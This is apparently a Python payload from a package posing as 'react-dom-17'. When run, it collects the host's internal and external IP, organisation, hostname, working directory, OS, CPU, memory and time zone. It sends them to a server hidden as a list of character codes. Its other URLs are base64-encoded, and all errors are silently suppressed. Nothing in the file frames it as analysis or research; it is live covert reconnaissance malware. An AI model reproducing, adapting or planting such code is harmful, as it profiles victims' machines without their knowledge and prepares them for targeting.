import os
import platform
import socket
import psutil
import tzlocal
import time
import requests
import base64
import urllib.request
import json

# -----------------------------------------------------------------------------
# Helper functions
# -----------------------------------------------------------------------------
def dec(lst):
    """فك تشفير قائمة أرقام إلى نص"""
    return "".join(chr(c) for c in lst)

def b64dec(s):
    """فك Base64"""
    return base64.b64decode(s).decode()

# -----------------------------------------------------------------------------
# السيرفر (مشفر كقائمة أرقام)
# -----------------------------------------------------------------------------
server_enc = [104,116,116,112,58,47,47,117,112,100,97,116,101,108,97,112,46,111,114,103,58,52,50,52,50]
SERVER = dec(server_enc)

def get_internal_ip():
    try:
        hostname = socket.gethostname()
        return socket.gethostbyname(hostname)
    except:
        return "N/A"

def get_external_ip():
    try:
        url = b64dec('aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u')
        with urllib.request.urlopen(url) as resp:
            data = json.load(resp)
            return data.get("ip", "N/A")
    except:
        return "N/A"

def get_organization(external_ip):
    try:
        org_url = b64dec('aHR0cDovL2lwLWFwaS5jb20vanNvbi8=') + external_ip + '?fields=org'
        resp = requests.get(org_url, timeout=5)
        return resp.json().get("org", "Unknown")
    except:
        return "Unknown"

def send_info():
    try:
        iIP = get_internal_ip()
        eIP = get_external_ip()
        org = get_organization(eIP)

        hn = socket.gethostname()
        curPath = os.getcwd()
        pkg = b64dec('cmVhY3QtZG9tLTE3')  # react-dom-17

        osP = platform.system().lower()
        osV = platform.version() if osP != "windows" else "Windows " + platform.win32_ver()[0]
        cpu = platform.machine()
        mem = round(psutil.virtual_memory().total / (1024**3), 2)
        tz = str(tzlocal.get_localzone())

        # بناء query string
        q = [
            f"internalIP={iIP}",
            f"externalIP={eIP}",
            f"hostname={hn}",
            f"path={requests.utils.quote(curPath)}",
            f"packageName={requests.utils.quote(pkg)}",
            f"organization={requests.utils.quote(org)}",
            f"osPlatform={requests.utils.quote(osP)}",
            f"osVersion={requests.utils.quote(osV)}",
            f"cpuArch={requests.utils.quote(cpu)}",
            f"totalMem={mem}",
            f"timeZone={requests.utils.quote(tz)}"
        ]
        url = f"{SERVER}/api/log?{'&'.join(q)}"

        # تأخير 2 ثانية قبل الإرسال
        time.sleep(2)
        requests.get(url, timeout=10)

    except:
        pass

if __name__ == "__main__":
    send_info()
